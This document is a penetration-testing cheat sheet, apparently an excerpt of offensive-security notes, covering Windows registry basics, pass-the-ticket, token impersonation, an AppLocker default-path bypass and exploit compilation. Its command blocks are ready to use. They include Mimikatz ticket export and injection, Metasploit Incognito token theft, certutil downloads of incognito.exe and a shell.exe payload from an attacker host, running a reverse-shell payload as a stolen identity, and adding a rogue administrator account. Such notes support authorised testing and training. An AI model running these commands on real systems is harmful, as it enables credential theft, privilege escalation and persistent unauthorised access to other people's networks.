Windows registery can be considered a database that contains low-level settings for the OS and applications. They are structured as follows:

* HKEY_CLASSES_ROOT
* HKEY_CURRENT_USER
* HKEY_LOCAL_MACHINE
* HKEY_USERS
* HKEY_CURRENT_CONFIG

They can also be accessed by replacing `c:\` with `HKLM:\` when you want to navigate using **powershell**. You can navigate to it using `cd HKLM:\`.

**`reg` & `regedit` Command**

  Windows also has a `reg` command that allows *add, remove, query, import, export, and so on* of registry keys

![](https://i.imgur.com/i40qsGD.png)

  `Regedit` can also be used to launch a GUI of the facility.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Pass-The-Ticket

Tags: [Mimikatz](#Mimikatz)

Great type of attack for lateral movement and privilege escalation __if there are unsecured domain service accounts laying around__. Allows you to escalate to domain admin if you dump a domain admins ticket and\
then impersonate using that ticket with Mimikatz. Think of it as reusing an existing ticket and not generating or destroying tickets.

![](https://i.imgur.com/SRT0Xty.png)

[Mimikatz](#Mimikatz)

Dumping tickets with Mimikatz will give you a `.kirbi` ticket that is used to obtain domain admin access __if__ a domain admin ticket is in the LSASS memory.  
Mimikatz required to be run as admin; without admin privs then the tool will not work properly. The tool is run directly from the target host.

```powershell
#MIMIKATZ: PASS THE TICKET
    %tmp%/mimikatz.exe						:Initialise and run program
    privilege::debug 						:Check if output = '20' OK - otherwise you dont have admin privs to run properly.
    sekurlsa::tickets /export				:Export all .kirbi tickets into the directory you are in.
    kerberos::ptt $TICKET					:Indicate the ticket you are using to impersonate, i.e the administrators base64 encoded tickets harvested with Rubeus.
    klist									:verify to check if successfully impersonated.
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Token Impersonation

Tags: [Windows-Privilege-Escalation](#Windows-Privilege-Escalation)

Windows uses tokens to ensure that accounts have the right privs to carry out particular actions. Account tokens are assigned when users log in or are authenticated and are similar in premise to "Web Tokens".
They are a temporary way to provide access without having to provide credentials when you access a file again. The tokens are not persistent and expire upon reboot.

**Note**: 
- File servers are treasure troves of tokens as most file servers are network attached drives via domain logon scripts.

There are two types of access tokens:

    primary access tokens: those associated with a user account that are generated on log on
    impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

    SecurityAnonymous: current user/client cannot impersonate another user/client
    SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
    SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

**INCOGNITO**

Incognito functions similar to how we steal and impersonate with web cookies by replaying that temporary key when we are logging in.
__Rotten Potato__ is another module you may run in conjunction with incognito. Initially there may not be any impersonation tokens available for incognito however using __Rotten Potato__ may produce a temporary one that you can quickly impersonate.

```powershell
#METASPLOIT
    load incognito						:Load metasploit module
    list_tokens -g or list_tokens -u	:List tokens based on $USER access. $ADMIN cannot see all tokens either but they have ability to migrate to SYSTEM process, SYSTEM is king and shows ALL TOKENS available.
    impersonate_token $USER				:Target specific token i.e "BUILTIN\Administrators" or may need "\\"

# Note that you might have NT AUTHORITY/SYSTEM but not the privs that will go along with it.
# You will need to migrate to another service that belongs to NT AUTHORITY/SYSTEM to further escalate your privs

    metasploit		:ps | grep services.exe
    metasploit		:migrate $PID

```

```powershell
#MANUAL
#[F LABS Standalone Binary](https://github.com/FSecureLABS/incognito)
    sudo python -m SimpleHTTPServer 80														:[Attacker], setup server to transfer incognito.exe
    Certutil -urlcache -f http://$RHOST:$RPORT/incognito.exe %tmp%/incognito.exe			:[Target], download incognito onto victim machine

#OPTION METHOD: EXISTING USER
    %tmp%/incognito.exe list_tokens -u												:List available Impersonation tokens
    net user $USER /domain															:Check user local and global groups to determine target
    Certutil -urlcache -f http://$RHOST:$RPORT/shell.exe %tmp%/shell.exe			:[Target], download shell.exe onto victim machine
    %tmp%/incognito.exe execute -c "$USER" %tmp%/$PAYLOAD							:Incognito to execute another payload such as msfvenom reverse shell and run as: "EXAMPLEAD\ExampleAdm"

#OPTIONAL METHOD: NEW USER
    ./incognito.exe add_user $USER  $PASS
    ./incognito.exe add_localgroup_user Administrators $USER
```

Then you can login your new user with RDP or ssh and access the privileged files.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Applocker Bypass

![](https://i.imgur.com/qpugWA4.png)

Applocker is a whitelisting tech that came with windows 7. Allowing the restrictions of which programs a user can execute based on the **path, publisher and hash**

If Applocker is configured with default rules, then the following directory is **whitelisted by default**

```powershell
#WHITELISTED(Default Rules)
    C:\Windows\System32\spool\drivers\color
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# Working-with-Exploits

## Linux-Exploits

For linux exploits first we need to compile the exploit and make the new document **executable** such as:

> - `gcc {exploitname.c} -o {new name}`
> - `chmod +x {new name}`

To run:

> - `./{new name}`

Sometimes the target machine is 32bit and cannot accept 64bit compiled binary. As such you need to see what architecture you are dealing with.\
32bit is represented by `i686` usually and 64bit represented by `x86_64`.

if a **C Compiler is missing** on the target machine, then you can compile on your own host machine before transferring over.\
You may also need to add the `-m32` to your compile command

**Cross-compiling**

Sometimes Windows C exploits won't compile and work out of the box. You will need to use cross-compiling tools to make it work.

> - `apt install mingw-w64`
> - Compile for 64bit `x86_64-w64-mingw32-gcc shell.c -o shell.exe`
> - Compile for 32bit `i686-w64-mingw32-gcc shell.c -o shell.exe`

**Python Exploits**

Python exploits are fairly easy to run as you just need to ensure you are using the exploit with the correct version **python** vs **python3** in order for the exploit to be successful.

Popular windows exploits such as `MS11-080` are written in python and to use these, you will need to make a `.exe` from the python file.

  **For windows**:

> - Installing PyWin32 on a windows machine and then the PyInstaller module
> - `python pyinstaller.py --onefile ms11-080.py`
> - This executable can then be **transferred to the victim machine** and run

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------














